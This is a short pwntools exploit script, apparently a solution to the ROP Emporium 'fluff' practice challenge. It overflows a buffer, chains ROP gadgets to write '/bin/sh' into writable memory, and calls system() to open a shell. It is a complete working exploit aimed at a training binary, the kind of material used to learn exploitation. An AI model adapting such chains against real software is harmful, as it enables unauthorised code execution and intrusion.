#!/usr/bin/env python2.7

from pwn import *

if args["GDB"]:
    p = gdb.debug('./fluff', '''
    set follow-fork-mode child
    set breakpoint pending on
    b *0x400832
    continue
    :''')
else:
    p = process("./fluff")

p.recv() # Discard initial message

data_section =  0x601050  # We have read-write here

pop_rdi =       p64(0x4008c3) # pop rdi; ret 
pop_r15 =       p64(0x4008c2) # pop r15; ret
pop_rsi_r15 =   p64(0x4008c1) # pop rsi; pop r15; ret
system =        p64(0x4005e0) # call system; ret
mov_rsi_edi =   p64(0x400821) # mov [rsi], edi; ret
pop_r12_13_14 = p64(0x4008bc) # pop r12; pop r13; pop r14; pop r15; ret
pop_r12_mov =   p64(0x400832) # pop r12; mov r13d, 0x604060; ret
xor_r11_r11 =   p64(0x400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret
xor_r11_r12 =   p64(0x40082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret
xchg_r11_r10 =  p64(0x400840) # xchg r11, r10; pop r15; mov r11d, 0x602050; ret
mov_r10_r11 =   p64(0x40084e) # mov [r10], r11; pop r13; pop r12; xor [r10], r12b; ret

rop = "A" * 40

# Getting 0x601050 into r10
rop += pop_r12_mov + p64(data_section)
rop += xor_r11_r11 + p64(0x0) # Null r11 and pop garbage into r14
rop += xor_r11_r12 + p64(0x0) # xor r11, r12 (so r11 is now val of r12) and pop garbage into r12
rop += xchg_r11_r10 + p64(0x0) # swap r11 and r10 and pop garbage into r15

# Write /bin/sh into r11
rop += pop_r12_mov + "/bin/sh\x00" # Write /bin/sh\x00 into r12
rop += xor_r11_r11 + p64(0x0) # Null r11 and pop garbage into r14
rop += xor_r11_r12 + p64(0x0) # Swap r11 and r12 (by xor) and pop garbage into r12

# Write /bin/sh to memory at address of r10
rop += mov_r10_r11 + p64(0x0) + p64(0x0)

# Call system with /bin/sh argument
rop += pop_rdi + p64(data_section)
rop += system
rop += "\x0a"


p.send(rop)

p.interactive()

p.close()
